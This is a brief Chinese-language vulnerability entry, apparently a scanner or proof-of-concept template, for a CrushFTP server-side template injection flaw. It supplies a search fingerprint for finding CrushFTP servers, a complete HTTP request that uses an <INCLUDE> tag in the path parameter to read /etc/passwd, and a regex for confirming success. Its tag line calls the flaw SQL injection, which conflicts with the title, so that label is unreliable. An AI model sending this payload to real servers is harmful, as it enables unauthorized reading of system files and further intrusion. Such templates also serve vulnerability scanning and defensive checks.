# CrushFTP服务器端模板注入漏洞

CrushFTP ｜ SQL注入 ｜ —
- **指纹**：`server="CrushFTP"`
- **请求**：`GET /WebInterface/function/?command=zip&c2f=7HhJ&path=%3CINCLUDE%3E/etc/passwd%3C/INCLUDE%3E&names=* HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$